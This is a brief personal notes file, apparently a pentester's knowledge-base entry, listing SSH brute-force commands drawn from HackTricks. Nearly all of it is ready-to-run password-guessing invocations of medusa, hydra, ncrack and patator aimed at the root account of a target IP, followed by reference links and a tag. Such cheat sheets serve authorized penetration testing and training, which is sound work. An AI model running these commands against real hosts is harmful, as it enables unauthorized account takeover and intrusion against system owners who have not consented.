# SSH brute force command shortlist from hacktricks
```bash
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```

# References
- [20221003150346](/zet/20221003150346/) SSH brute force
- ~/kb/hacking/misc/bruteforcing-tools.md

Tags:
    #assorted

